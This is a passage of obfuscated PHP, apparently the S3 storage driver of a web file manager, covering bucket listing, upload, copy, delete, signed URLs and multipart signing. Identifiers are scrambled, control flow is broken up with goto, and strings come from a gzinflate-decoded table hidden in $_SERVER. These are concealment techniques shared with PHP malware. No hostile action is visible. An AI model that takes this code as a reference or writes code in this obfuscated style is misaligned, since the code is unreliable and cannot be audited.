$f°Ûá¨Ïİ[4] . $eµ»ã¨ª‡[$f°Ûá¨Ïİ[170]]; } return $bÑ¨ñ¢óš . $f°Ûá¨Ïİ[171] . $Eƒ‹·ö”óÍ; } public function pathEncode($dƒ¨Û›ø÷) { $d¹Ğã¶‘¤˜ =& $_SERVER[¦·]; return str_replace($d¹Ğã¶‘¤˜[172], $d¹Ğã¶‘¤˜[8], rawurlencode($dƒ¨Û›ø÷)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($DÛ²®·–«) { set_timeout(); require_once SDK_DIR . $_SERVER[¦·][173]; parent::__construct(); $this->_init($DÛ²®·–«); } public function _init($AÂÎ°Ä•î‘) { foreach ($AÂÎ°Ä•î‘ as $c–ë¿ÔƒŒ => $cö²ŠæÌí£) { if (isset($this->{$c–ë¿ÔƒŒ})) { $this->{$c–ë¿ÔƒŒ} = $cö²ŠæÌí£; } } $this->endpoint = $AÂÎ°Ä•î‘[$_SERVER[¦·][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($cÍ¹¸Ëåé‰ = "\166\x34") { $this->signVer = $cÍ¹¸Ëåé‰; $this->client->setSignatureVersion($cÍ¹¸Ëåé‰); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dÁÒ”ì; c£ÖŒƒ¹ : $CÆĞ²³™†ò = array($bö„†ì²¦÷[180], $bö„†ì²¦÷[181], $bö„†ì²¦÷[182], $bö„†ì²¦÷[183], $bö„†ì²¦÷[184]); $AÂ®—´Åƒ  = array_diff($CÆĞ²³™†ò, $b§‰¦ïØª‹); return empty($AÂ®—´Åƒ ); goto cº®Ó…æ’‰; dÁÒ”ì: $bö„†ì²¦÷ =& $_SERVER[¦·]; $E‚”éÙŠ½ = $this->getBucketCors(); if (!$E‚”éÙŠ½ || !is_array($E‚”éÙŠ½)) { return !1; } goto E¾Œãñ×Œ¹; E¾Œãñ×Œ¹: if ($E‚”éÙŠ½[$bö„†ì²¦÷[175]] != $bö„†ì²¦÷[176] || $E‚”éÙŠ½[$bö„†ì²¦÷[177]] != $bö„†ì²¦÷[176]) { return !1; } $b§‰¦ïØª‹ = array_map($bö„†ì²¦÷[178], $E‚”éÙŠ½[$bö„†ì²¦÷[179]]); if (!is_array($b§‰¦ïØª‹)) { $b§‰¦ïØª‹ = array(); } goto c£ÖŒƒ¹ ; cº®Ó…æ’‰: } public function mkfile($A¸¡à‡µŠË, $F‡ØÃô³¬ = '', $b¾Ú¶¯ï § = REPEAT_RENAME) { $C§¯ï¿ĞÁ™ = $this->setContent($A¸¡à‡µŠË, $F‡ØÃô³¬); if ($C§¯ï¿ĞÁ™ !== !1) { return $this->getPathOuter($A¸¡à‡µŠË); } return !1; } public function mkdir($eäÄ¤êÒ¦…, $c¯•ÉÖëÂÄ = REPEAT_SKIP) { if (empty($eäÄ¤êÒ¦…)) { return !1; } if ($this->_isFolder($eäÄ¤êÒ¦…)) { return $this->getPathOuter($eäÄ¤êÒ¦…); } $D‡«åù‘Ş = $this->setContent($eäÄ¤êÒ¦…, $_SERVER[¦·][33], !0); if ($D‡«åù‘Ş !== !1) { return $this->getPathOuter($eäÄ¤êÒ¦…); } return !1; } public function copyFile($Cíöñ—¾´ß, $d¨‘‘à’¨ï, $Aâ«ÏÕÏÁõ = array()) { $B•‡Ÿ³¶ =& $_SERVER[¦·]; $Cæ˜Í­“Èç = $this->objectMeta($Cíöñ—¾´ß); if (!$Cæ˜Í­“Èç) { return !1; } if ($Cæ˜Í­“Èç[$B•‡Ÿ³¶[77]] <= 1024 * 1024 * 200) { $Eä»àÃ¨©Ó = $this->client->copyObject($this->bucket, $Cíöñ—¾´ß, $this->bucket, $d¨‘‘à’¨ï, $B•‡Ÿ³¶[185], $Aâ«ÏÕÏÁõ); } else { $Eä»àÃ¨©Ó = $this->client->multiCopyObject($this->bucket, $Cíöñ—¾´ß, $this->bucket, $d¨‘‘à’¨ï, $Aâ«ÏÕÏÁõ); } $Eä»àÃ¨©Ó = $Eä»àÃ¨©Ó ? $this->getPathOuter($d¨‘‘à’¨ï) : !1; return $Eä»àÃ¨©Ó; } public function moveFile($b„Ÿ·æñ¸¦, $d«¤”º’è¢) { if ($this->copyFile($b„Ÿ·æñ¸¦, $d«¤”º’è¢)) { $this->delFile($b„Ÿ·æñ¸¦); return $this->getPathOuter($d«¤”º’è¢); } return !1; } public function delFile($e•ƒêî³Œ) { return $this->client->deleteObject($this->bucket, $e•ƒêî³Œ); } public function delFolder($F×ƒí•ÔÓ) { goto aãŠ‚Ø÷Á³; aãŠ‚Ø÷Á³: $eÍğ¾Ò¹ì =& $_SERVER[¦·]; $D•ŒöÊ‘ ò = $this->listObjs($F×ƒí•ÔÓ); if (!$D•ŒöÊ‘ ò) { $F×ƒí•ÔÓ = trim($F×ƒí•ÔÓ, $eÍğ¾Ò¹ì[8]); if (!empty($F×ƒí•ÔÓ)) { $F×ƒí•ÔÓ .= $eÍğ¾Ò¹ì[8]; } return $this->delFile($F×ƒí•ÔÓ); } goto E¼ƒ›Í‚¢; E¼ƒ›Í‚¢: $EòÁ›‡¤Èˆ = $AÜÖó©ì† = 0; $D‹‰¯ÉŒ‘ = array_chunk(array_keys($D•ŒöÊ‘ ò), 1000); foreach ($D‹‰¯ÉŒ‘ as $D Æ¥èÁÀ) { $EòÁ›‡¤Èˆ++; $AÜÖó©ì† += (int) $this->client->deleteObjects($this->bucket, $D Æ¥èÁÀ); } goto D¬™‘ÆÏµ“; D¬™‘ÆÏµ“: return $EòÁ›‡¤Èˆ === $AÜÖó©ì† ? !0 : !1; goto a·ó‰ Îö; a·ó‰ Îö: } public function rename($d‰Áƒ¼¦„, $fêÏ×êè‘) { return $this->renameObject($d‰Áƒ¼¦„, $fêÏ×êè‘); } public function listPath($DšÔ„Ì², $C’ÂÇ†¸ Ÿ = false) { $f§ÃÔ¿¢›“ =& $_SERVER[¦·]; $aôƒÎºÇƒ¾ = $this->listObjs($DšÔ„Ì², null, null, $f§ÃÔ¿¢›“[8]); $e‘ƒß®ô–ƒ = array($f§ÃÔ¿¢›“[74] => array(), $f§ÃÔ¿¢›“[73] => array()); foreach ($aôƒÎºÇƒ¾ as $d¡‘Ä†ƒ½æ => $dŒî‡ÖÀ†’) { if ($d¡‘Ä†ƒ½æ == $f§ÃÔ¿¢›“[8]) { continue; } if (isset($dŒî‡ÖÀ†’[$f§ÃÔ¿¢›“[186]])) { $e‘ƒß®ô–ƒ[$f§ÃÔ¿¢›“[74]][] = $this->folderInfo($dŒî‡ÖÀ†’[$f§ÃÔ¿¢›“[186]], $C’ÂÇ†¸ Ÿ); } else { if (substr($dŒî‡ÖÀ†’[$f§ÃÔ¿¢›“[28]], -1) == $f§ÃÔ¿¢›“[8]) { continue; } $e‘ƒß®ô–ƒ[$f§ÃÔ¿¢›“[73]][] = $this->fileInfo($dŒî‡ÖÀ†’[$f§ÃÔ¿¢›“[28]], $C’ÂÇ†¸ Ÿ, $dŒî‡ÖÀ†’); } } return $e‘ƒß®ô–ƒ; } private function fileInfo($Dİ»ÉÅ”©ˆ, $FÀÂ±ƒ±± = false, $DÍÂë²Şª = array()) { goto dÌëßµ™‹; D”ÑÓ·ùÁ±: return $eá±Õà­‰; goto d¦Æ„Ô•ç¬; dÌëßµ™‹: $CœÜœÅÆ² =& $_SERVER[¦·]; if ($FÀÂ±ƒ±±) { return array($CœÜœÅÆ²[28] => $this->pathThis($Dİ»ÉÅ”©ˆ), $CœÜœÅÆ²[75] => $this->getPathOuter($Dİ»ÉÅ”©ˆ), $CœÜœÅÆ²[29] => $CœÜœÅÆ²[167], $CœÜœÅÆ²[160] => $this->ext($Dİ»ÉÅ”©ˆ), $CœÜœÅÆ²[77] => isset($DÍÂë²Şª[$CœÜœÅÆ²[77]]) ? $DÍÂë²Şª[$CœÜœÅÆ²[77]] : 0, $CœÜœÅÆ²[187] => 0, $CœÜœÅÆ²[107] => 0, $CœÜœÅÆ²[188] => !0, $CœÜœÅÆ²[189] => !0); } $eá±Õà­‰ = array($CœÜœÅÆ²[28] => $this->pathThis($Dİ»ÉÅ”©ˆ), $CœÜœÅÆ²[75] => $this->getPathOuter($Dİ»ÉÅ”©ˆ), $CœÜœÅÆ²[29] => $CœÜœÅÆ²[167], $CœÜœÅÆ²[187] => 0, $CœÜœÅÆ²[107] => 0, $CœÜœÅÆ²[77] => 0, $CœÜœÅÆ²[160] => $this->ext($Dİ»ÉÅ”©ˆ), $CœÜœÅÆ²[188] => !0, $CœÜœÅÆ²[189] => !0); goto FÉ’Â¿˜á; FÉ’Â¿˜á: if (empty($DÍÂë²Şª)) { $DÍÂë²Şª = $this->objectMeta($Dİ»ÉÅ”©ˆ); if (!$DÍÂë²Şª) { return $eá±Õà­‰; } } if (isset($DÍÂë²Şª[$CœÜœÅÆ²[190]])) { $eá±Õà­‰[$CœÜœÅÆ²[107]] = $DÍÂë²Şª[$CœÜœÅÆ²[190]]; } if (isset($DÍÂë²Şª[$CœÜœÅÆ²[77]])) { $eá±Õà­‰[$CœÜœÅÆ²[77]] = $DÍÂë²Şª[$CœÜœÅÆ²[77]]; } goto D”ÑÓ·ùÁ±; d¦Æ„Ô•ç¬: } private function folderInfo($b†—Œ©ºË¶, $Eñ­™„ÇÚ¥ = false) { goto eˆî´ñÌíƒ; fë¸£×½ÊÁ: if ($b†—Œ©ºË¶ == $BâòÀ«ì°×[33]) { return $B†Ş«ßÜ½; } $b†—Œ©ºË¶ = trim($b†—Œ©ºË¶, $BâòÀ«ì°×[8]) . $BâòÀ«ì°×[8]; $dâ±¹®ÆÌˆ = $this->objectMeta($b†—Œ©ºË¶); goto DÆ˜©„ÚãÕ; DÆ˜©„ÚãÕ: if (isset($dâ±¹®ÆÌˆ[$BâòÀ«ì°×[190]])) { $B†Ş«ßÜ½[$BâòÀ«ì°×[187]] = $dâ±¹®ÆÌˆ[$BâòÀ«ì°×[190]]; } return $B†Ş«ßÜ½; goto DâÇëÌÑ®Æ; eˆî´ñÌíƒ: $BâòÀ«ì°× =& $_SERVER[¦·]; if ($Eñ­™„ÇÚ¥) { return array($BâòÀ«ì°×[28] => $this->pathThis($b†—Œ©ºË¶), $BâòÀ«ì°×[75] => $this->getPathOuter($BâòÀ«ì°×[8] . $b†—Œ©ºË¶), $BâòÀ«ì°×[29] => $BâòÀ«ì°×[76], $BâòÀ«ì°×[188] => !0, $BâòÀ«ì°×[189] => !0); } $B†Ş«ßÜ½ = array($BâòÀ«ì°×[28] => $this->pathThis($b†—Œ©ºË¶), $BâòÀ«ì°×[75] => $this->getPathOuter($BâòÀ«ì°×[8] . $b†—Œ©ºË¶), $BâòÀ«ì°×[29] => $BâòÀ«ì°×[76], $BâòÀ«ì°×[187] => 0, $BâòÀ«ì°×[107] => 0, $BâòÀ«ì°×[188] => !0, $BâòÀ«ì°×[189] => !0); goto fë¸£×½ÊÁ; DâÇëÌÑ®Æ: } public function listObjs($e‚¤â°ÕÀ, $EìäŠ±“ò = null, $eæöêæ£‰ò = null, $e†åãğáˆÊ = null) { $c×ÕÑ™ïË =& $_SERVER[¦·]; $e‚¤â°ÕÀ = trim($e‚¤â°ÕÀ, $c×ÕÑ™ïË[8]); $fÕÍ‘Çìèù = empty($e‚¤â°ÕÀ) ? $c×ÕÑ™ïË[33] : $e‚¤â°ÕÀ . $c×ÕÑ™ïË[8]; return $this->client->getBucket($this->bucket, $fÕÍ‘Çìèù, $EìäŠ±“ò, $eæöêæ£‰ò, $e†åãğáˆÊ, !0); } public function has($bÔ¤ä‹Ø³ç, $F¤«£¾ôĞ´ = false, $C…¾—¬É…Ø = true) { goto Eêâ‚¼½ÚÃ; då÷òøÒÑ: if ($F¤«£¾ôĞ´) { return array($B¬Î²¸ÉÙÃ[191] => $DÜÅŠÃôÑí, $B¬Î²¸ÉÙÃ[192] => $Eµäˆ¦…¡); } return !1; goto fÕ”‹£÷î¹; Eêâ‚¼½ÚÃ: $B¬Î²¸ÉÙÃ =& $_SERVER[¦·]; $DÜÅŠÃôÑí = 0; $Eµäˆ¦…¡ = 0; goto AƒÛ—ßø¿Š; AƒÛ—ßø¿Š: $AµÍ”„’ÅÖ = $this->listObjs($bÔ¤ä‹Ø³ç, null, null, $B¬Î²¸ÉÙÃ[8]); $AµÍ”„’ÅÖ = is_array($AµÍ”„’ÅÖ) ? $AµÍ”„’ÅÖ : array(); foreach ($AµÍ”„’ÅÖ as $CïÂÙ‚«×) { if (isset($CïÂÙ‚«×[$B¬Î²¸ÉÙÃ[28]]) && substr($CïÂÙ‚«×[$B¬Î²¸ÉÙÃ[28]], -1) != $B¬Î²¸ÉÙÃ[8]) { if (!$F¤«£¾ôĞ´ && $C…¾—¬É…Ø) { return !0; } $DÜÅŠÃôÑí++; } else { if (isset($CïÂÙ‚«×[$B¬Î²¸ÉÙÃ[186]])) { if (!$F¤«£¾ôĞ´ && !$C…¾—¬É…Ø) { return !1; } $Eµäˆ¦…¡++; } } } goto då÷òøÒÑ; fÕ”‹£÷î¹: } public function listAll($C†®Å×¡º) { $aõæ˜¦èË =& $_SERVER[¦·]; $aîÛºµ“©Ó = $this->listObjs($C†®Å×¡º); $AÑÇÊì ŠÌ = $e°Ñ˜ÔßåÖ = array(); foreach ($aîÛºµ“©Ó as $a¥§Â¡‚Ûñ => $F¿Æ ñä¸ï) { $AÑÇÊì ŠÌ[] = $F¿Æ ñä¸ï[$aõæ˜¦èË[28]]; $e°Ñ˜ÔßåÖ[$a¥§Â¡‚Ûñ] = $F¿Æ ñä¸ï[$aõæ˜¦èË[77]]; } return $this->listAllFiles($C†®Å×¡º, $AÑÇÊì ŠÌ, $e°Ñ˜ÔßåÖ); } public function canRead($A¯ÜøèÙ‚) { $Bæå×Šù°¡ =& $_SERVER[¦·]; $Aˆ×”‰Âå½ = $this->client->getAccessControlPolicy($this->bucket, $A¯ÜøèÙ‚); if (!$Aˆ×”‰Âå½) { return !1; } return in_array($Aˆ×”‰Âå½, array($Bæå×Šù°¡[193], $Bæå×Šù°¡[194], $Bæå×Šù°¡[195])) ? !0 : !1; } public function canWrite($dÛŠŒ’óİ) { $bßÂÂÀ–½ =& $_SERVER[¦·]; $D‰Ûé«¯À = $this->client->getAccessControlPolicy($this->bucket, $dÛŠŒ’óİ); if (!$D‰Ûé«¯À) { return !1; } return in_array($D‰Ûé«¯À, array($bßÂÂÀ–½[193], $bßÂÂÀ–½[194])) ? !0 : !1; } public function getContent($AŸÀš“ Í£) { return $this->client->getObject($this->bucket, $AŸÀš“ Í£); } public function setContent($e¸ÜŸÕğæ, $eì¬•¢ Ü = '', $a¤´Âƒ‘Û = false) { goto D„Ï¬Ù†ç­; D„Ï¬Ù†ç­: $A­¦¨×ä§À =& $_SERVER[¦·]; $e¸ÜŸÕğæ = $a¤´Âƒ‘Û ? trim($e¸ÜŸÕğæ, $A­¦¨×ä§À[8]) . $A­¦¨×ä§À[8] : $e¸ÜŸÕğæ; $EŸˆš£½¥á = get_file_mime(get_path_ext($e¸ÜŸÕğæ)); goto Cä¤”Ÿ‚ù£; eˆßÙƒÈÛ: $this->cacheMethod(null, null); $bâƒ¶‡Û§ª = $this->copyFile($e¸ÜŸÕğæ, $e¸ÜŸÕğæ, array($A­¦¨×ä§À[196] => $bâƒ¶‡Û§ª[$A­¦¨×ä§À[197]])); return $bâƒ¶‡Û§ª ? !0 : !1; goto e†§ÏŒ» „; Cä¤”Ÿ‚ù£: $bâƒ¶‡Û§ª = $this->client->putObject($eì¬•¢ Ü, $this->bucket, $e¸ÜŸÕğæ, $A­¦¨×ä§À[185], array(), $EŸˆš£½¥á); if (!$bâƒ¶‡Û§ª) { return !1; } if ($a¤´Âƒ‘Û) { return !0; } goto eˆßÙƒÈÛ; e†§ÏŒ» „: } public function fileSubstr($FÙ“ªÇ—µ–, $e×Óİ¿«‰“, $FÒÇÃ‘„µ) { $EÍµß°„šÏ = $e×Óİ¿«‰“ + $FÒÇÃ‘„µ - 1; return $this->client->getObject($this->bucket, $FÙ“ªÇ—µ–, array($_SERVER[¦·][198] => "\x62\x79\164\x65\163\x3d{$e×Óİ¿«‰“}\55{$EÍµß°„šÏ}")); } public function upload($bË°œ™‰ÙÏ, $DÍ§±«¶ĞÍ, $dò‚õºùòÙ = false, $F‹÷…®†‰‡ = REPEAT_REPLACE) { $Eå¿„—Ú» =& $_SERVER[¦·]; $bÅ‚¡²²ö¤ = array($Eå¿„—Ú»[196] => @md5_file($DÍ§±«¶ĞÍ)); $BÜÙ¿´¾éÁ = array($Eå¿„—Ú»[199] => get_file_mime(get_path_ext($bË°œ™‰ÙÏ))); if (IO::size($DÍ§±«¶ĞÍ) <= 1024 * 1024 * 200) { $Dº¬¼Ïª = $this->client->putObjectFile($DÍ§±«¶ĞÍ, $this->bucket, $bË°œ™‰ÙÏ, $Eå¿„—Ú»[185], $bÅ‚¡²²ö¤, $BÜÙ¿´¾éÁ); return !empty($Dº¬¼Ïª) ? $this->getPathOuter($bË°œ™‰ÙÏ) : !1; } $A“‚º«À… = $this->client->multiUploadObject($DÍ§±«¶ĞÍ, $this->bucket, trim($bË°œ™‰ÙÏ, $Eå¿„—Ú»[8]), $bÅ‚¡²²ö¤, $BÜÙ¿´¾éÁ); return $A“‚º«À… ? $this->getPathOuter($bË°œ™‰ÙÏ) : !1; } public function download($AŒ÷·ºÍó, $föÑµÔÂÏ”) { if (!@is_dir($this->pathFather($föÑµÔÂÏ”)) && !IO::mkdir($this->pathFather($föÑµÔÂÏ”))) { return !1; } $f‰éŠÆ§Œ = $this->client->getObject($this->bucket, $AŒ÷·ºÍó, array(), $föÑµÔÂÏ”); return $f‰éŠÆ§Œ !== !1 ? $föÑµÔÂÏ” : !1; } public function link($bªÌĞÒ©, $f˜Œ«º›äÆ = array()) { $E…†ŞÑ‡ƒ› =& $_SERVER[¦·]; if ($this->signVer == $E…†ŞÑ‡ƒ›[200]) { return $this->client->getAuthenticatedURL($this->bucket, $bªÌĞÒ©, 3600 * 12, $f˜Œ«º›äÆ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($bªÌĞÒ©, $E…†ŞÑ‡ƒ›[8]), 3600 * 12, $this->region, array(), !0, $f˜Œ«º›äÆ); } public function fileOut($cË·Å†í‰, $a¡³×ÊæÔ = false, $aŞŒ‰ŒÊö = false, $EõæÚÀ¬ÒÜ = '') { goto eÓÏô·ƒ–; eÓÏô·ƒ–: $BÔ½¶áåŸ© =& $_SERVER[¦·]; if ($this->isFileOutServer()) { return $this->fileOutServer($cË·Å†í‰, $a¡³×ÊæÔ, $aŞŒ‰ŒÊö, $EõæÚÀ¬ÒÜ); } if (!$aŞŒ‰ŒÊö) { $aŞŒ‰ŒÊö = $this->pathThis($cË·Å†í‰); } goto cÃ¥Üˆè•†; D–ÍÔ§Óó: $FêĞøÀ†›Ò = array($BÔ½¶áåŸ©[204] => $a¡³×ÊæÔ . $BÔ½¶áåŸ©[205] . rawurlencode($aŞŒ‰ŒÊö), $BÔ½¶áåŸ©[206] => $A·¥±Õ‰Ä); $AºôÕ¡Å¡¨ = $this->link($cË·Å†í‰, $FêĞøÀ†›Ò); $this->fileOutLink($AºôÕ¡Å¡¨); goto a¶‰¬åÉ¸ñ; cÃ¥Üˆè•†: $A·¥±Õ‰Ä = get_file_mime(get_path_ext($aŞŒ‰ŒÊö)); if ($A·¥±Õ‰Ä == $BÔ½¶áåŸ©[201]) { return parent::fileOut($cË·Å†í‰, $a¡³×ÊæÔ, $aŞŒ‰ŒÊö, $EõæÚÀ¬ÒÜ); } $a¡³×ÊæÔ = $a¡³×ÊæÔ ? $BÔ½¶áåŸ©[202] : $BÔ½¶áåŸ©[203]; goto D–ÍÔ§Óó; a¶‰¬åÉ¸ñ: } public function fileOutServer($eÍ…£Œêğ§, $bÈè¯ù·˜Ã = false, $bˆæßÒĞ…‘ = false, $FÜÔóæ ¨ˆ = '') { parent::fileOut($eÍ…£Œêğ§, $bÈè¯ù·˜Ã, $bˆæßÒĞ…‘, $FÜÔóæ ¨ˆ); } public function fileOutImageServer($Cà¡‰ƒÊ­, $cİÀÁ™©  = 250) { parent::fileOutImage($Cà¡‰ƒÊ­, $cİÀÁ™© ); } public function hashMd5($c÷õÆ¬…»«, $A®­®½±˜é = '') { $d“›Ù¿×·å =& $_SERVER[¦·]; $eÃ»îŞ¼¹› = $this->objectMeta($c÷õÆ¬…»«); if (!$eÃ»îŞ¼¹›) { return !1; } $A®­®½±˜é = $A®­®½±˜é ? $A®­®½±˜é : _get($eÃ»îŞ¼¹›, $d“›Ù¿×·å[207]); $A®­®½±˜é = $A®­®½±˜é ? $A®­®½±˜é : _get($eÃ»îŞ¼¹›, $d“›Ù¿×·å[197], $d“›Ù¿×·å[33]); return $A®­®½±˜é; } public function uploadFormData($B¥ó»†¨ğ, $AåÀäÕÖñØ = 3600) { $EÇ¤ˆÏæÙ =& $_SERVER[¦·]; $Cº›ÒŞŠç = $this->pathFather($B¥ó»†¨ğ); $dĞÎÍ‚…Ñ = $this->client->getHttpUploadPostParams($this->bucket, $Cº›ÒŞŠç, $EÇ¤ˆÏæÙ[185], $AåÀäÕÖñØ); return array_merge((array) $dĞÎÍ‚…Ñ, array($EÇ¤ˆÏæÙ[169] => $this->getHost())); } public function multiUploadFormData($AÂ‰ªµÚ÷ã, $A–ùÆ¡âå = 3600) { $f¥ñå®á¡¢ =& $_SERVER[¦·]; $cºèŸõ®± = gmdate($f¥ñå®á¡¢[208]); $A¦¦öàíÏ = array(); $f‹ÁöÚƒ®© = $this->client->getUploadId($this->bucket, $AÂ‰ªµÚ÷ã, $A¦¦öàíÏ); if (!$f‹ÁöÚƒ®©) { return !1; } return array($f¥ñå®á¡¢[209] => $f‹ÁöÚƒ®©, $f¥ñå®á¡¢[169] => $this->getHost() . $f¥ñå®á¡¢[8] . $this->pathEncode($AÂ‰ªµÚ÷ã), $f¥ñå®á¡¢[210] => $cºèŸõ®±, $f¥ñå®á¡¢[89] => $AÂ‰ªµÚ÷ã); } public function multiUploadAuthData($C„òÒ¿£Ê‰, $F©‘¡¹×æ´ = array()) { goto fí•Ê»ïì™; AŒ™Ë‘§¬‹: $AÛ‰šµÜ† = array($BÀğÉ¯…Œå[212], $BÀğÉ¯…Œå[33], $BÀğÉ¯…Œå[116], $BÀğÉ¯…Œå[33], "\x78\55\x61\x6d\x7a\x2d\144\x61\164\145\x3a{$cƒÂÈÅÛ«Š}", $BÀğÉ¯…Œå[8] . $this->bucket . $BÀğÉ¯…Œå[8] . $this->pathEncode($BŠœÜª‘´£) . $c¨À— Úàç); if (strpos($c¨À— Úàç, $BÀğÉ¯…Œå[213]) === 0) { $AÛ‰šµÜ†[0] = $BÀğÉ¯…Œå[214]; } if (isset($F©‘¡¹×æ´[$BÀğÉ¯…Œå[215]]) && $F©‘¡¹×æ´[$BÀğÉ¯…Œå[215]] == $BÀğÉ¯…Œå[216]) { $AÛ‰šµÜ†[0] = $BÀğÉ¯…Œå[216]; } goto Fñòä¬Ùà›; Bæƒ¥„›¿: $BŠœÜª‘´£ = $F©‘¡¹×æ´[$BÀğÉ¯…Œå[89]]; unset($F©‘¡¹×æ´[$BÀğÉ¯…Œå[89]]); if (isset($F©‘¡¹×æ´[$BÀğÉ¯…Œå[211]])) { $F©‘¡¹×æ´[$BÀğÉ¯…Œå[210]] = $cƒÂÈÅÛ«Š; return $this->listUploadParts($BŠœÜª‘´£, $F©‘¡¹×æ´); } goto AŒ™Ë‘§¬‹; bÇ¹ŠİñÇ: if (strpos($c¨À— Úàç, $BÀğÉ¯…Œå[213]) === 0) { return array($BÀğÉ¯…Œå[220] => $d‡î´ÖÕÄà, $BÀğÉ¯…Œå[210] => $cƒÂÈÅÛ«Š); } return $d‡î´ÖÕÄà; goto c¤…„„ÖÒ; Fñòä¬Ùà›: $Eİ´ËŠèáê = implode($BÀğÉ¯…Œå[217], $AÛ‰šµÜ†); $E¨Ÿˆ·ôƒ¨ = base64_encode(hash_hmac($BÀğÉ¯…Œå[218], $Eİ´ËŠèáê, $this->secret, !0)); $d‡î´ÖÕÄà = $BÀğÉ¯…Œå[219] . $this->accessKey . $BÀğÉ¯…Œå[4] . $E¨Ÿˆ·ôƒ¨; goto bÇ¹ŠİñÇ; fí•Ê»ïì™: $BÀğÉ¯…Œå =& $_SERVER[¦·]; $cƒÂÈÅÛ«Š = isset($F©‘¡¹×æ´[$BÀğÉ¯…Œå[210]]) ? $F©‘¡¹×æ´[$BÀğÉ¯…Œå[210]] : gmdate($BÀğÉ¯…Œå[208]); $c¨À— Úàç = isset($F©‘¡¹×æ´[$BÀğÉ¯…Œå[160]]) ? $F©‘¡¹×æ´[$BÀğÉ¯…Œå[160]] : $BÀğÉ¯…Œå[33]; goto Bæƒ¥„›¿; c¤…„„ÖÒ: } public function listUploadParts($B†¿©æ¾õœ, $eÙ‡§Ÿ¸¿• = array()) { goto döÔ¢ÕÀÒ; BÛ²×‡á·’: $bêæµ½œç© = $this->multiUploadAuthData($B†¿©æ¾õœ, $eÙ‡§Ÿ¸¿•); if (empty($bêæµ½œç©)) { return !1; } return array($dé×£Õ¯¿[220] => $bêæµ½œç©, $dé×£Õ¯¿[210] => $eÙ‡§Ÿ¸¿•[$dé×£Õ¯¿[210]], $dé×£Õ¯¿[222] => $F†Ÿéï‡); goto CÏï”ç‚ ; FªïĞˆÔ: if (!$F†Ÿéï‡) { return !1; } unset($eÙ‡§Ÿ¸¿•[$dé×£Õ¯¿[211]], $eÙ‡§Ÿ¸¿•[$dé×£Õ¯¿[215]]); $eÙ‡§Ÿ¸¿•[$dé×£Õ¯¿[89]] = $B†¿©æ¾õœ; goto BÛ²×‡á·’; döÔ¢ÕÀÒ: $dé×£Õ¯¿ =& $_SERVER[¦·]; $Fö…¥ùí•” = str_replace($dé×£Õ¯¿[221], $dé×£Õ¯¿[33], $eÙ‡§Ÿ¸¿•[$dé×£Õ¯¿[160]]); $F†Ÿéï‡ = $this->client->listParts($this->bucket, $B†¿©æ¾õœ, $Fö…¥ùí•”); goto FªïĞˆÔ; CÏï”ç‚ : } public function getHost() { return parent::getHost() . $_SERVER[¦·][8] . $this->bucket; } public function size($cèê¶…ï) { $E·½ïùÙ—‹ = $this->objectMeta($cèê¶…ï); return $E·½ïùÙ—‹ ? $E·½ïùÙ—‹[$_SERVER[¦·][77]] : 0; } public function info($e¥Ü†šÈÃó) { if ($this->isFolder($e¥Ü†šÈÃó)) { return $this->folderInfo($e¥Ü†šÈÃó); } else { if ($this->isFile($e¥Ü†šÈÃó)) { return $this->fileInfo($e¥Ü†šÈÃó); } } return !1; } public function exist($A¢Ï‡ŞÄ) { return $this->isFile($A¢Ï‡ŞÄ) || $this->isFolder($A¢Ï‡ŞÄ); } public function isFile($D‘ìœ½êšİ) { return !$this->isFolder($D‘ìœ½êšİ) && $this->objectMeta($D‘ìœ½êšİ); } public function isFolder($d¥‚âÒÅìÑ) { return $this->cacheMethod($_SERVER[¦·][223], $d¥‚âÒÅìÑ); } protected function objectMeta($eê¢ÛøÆš) { return $this->cacheMethod($_SERVER[¦·][224], $eê¢ÛøÆš); } protected function _objectMeta($A°Ÿ‰Ñ¤ê) { $b£ó¨œ‚á¨ =& $_SERVER[¦·]; $A°Ÿ‰Ñ¤ê = rtrim($A°Ÿ‰Ñ¤ê, $b£ó¨œ‚á¨[8]); try { $C·æ‚ç˜§ = $this->client->getObjectInfo($this->bucket, $A°Ÿ‰Ñ¤ê); if (!isset($C·æ‚ç˜§[$b£ó¨œ‚á¨[207]]) && isset($C·æ‚ç˜§[$b£ó¨œ‚á¨[225]])) { $C·æ‚ç˜§[$b£ó¨œ‚á¨[207]] = $C·æ‚ç˜§[$b£ó¨œ‚á¨[225]]; } } catch (Exception $DÁÓãÌÀ•) { $C·æ‚ç˜§ = !1; } if (!$C·æ‚ç˜§) { } return $C·æ‚ç˜§; } protected function _isFolder($b‘ç¯Ë’ù) { goto c›¿–Øƒ†â; c›¿–Øƒ†â: $fŸ•¡ìœÕ‡ =& $_SERVER[¦·]; $b‘ç¯Ë’ù = rtrim($b‘ç¯Ë’ù, $fŸ•¡ìœÕ‡[8]); if ($b‘ç¯Ë’ù == $fŸ•¡ìœÕ‡[33] || $b‘ç¯Ë’ù == $fŸ•¡ìœÕ‡[8]) { return !0; } goto Cò²Ó©Á; F®«’„ ­: if (substr($b²ˆ¸²Ğ×Ê[0][$fŸ•¡ìœÕ‡[28]], -1) == $fŸ•¡ìœÕ‡[8]) { return !0; } if (get_path_this($b²ˆ¸²Ğ×Ê[0][$fŸ•¡ìœÕ‡[28]]) == get_path_this($b‘ç¯Ë’ù)) { return !1; } return !0; goto D½íİÄ•¬; Cò²Ó©Á: $b²ˆ¸²Ğ×Ê = $this->client->getBucket($this->bucket, $b‘ç¯Ë’ù, null, 1); if (empty($b²ˆ¸²Ğ×Ê)) { return !1; } $b²ˆ¸²Ğ×Ê = array_values($b²ˆ¸²Ğ×Ê); goto F®«’„ ­; D½íİÄ•¬: } } define($_SERVER[¦·][226], 1); goto a´±„¸‡Ú; EäæëÆŸ¯: define($_SERVER[¦·][0], $_SERVER[¦·][1]); $_SERVER[æªÊ«] = explode($_SERVER[¦·][2], gzinflate(substr($_SERVER[¦·][3], 10, -8))); function Model($B¼İèØ•Ùï = '', $fğ©©»ˆÕÎ = '', $CŠ’´À±¼ß = 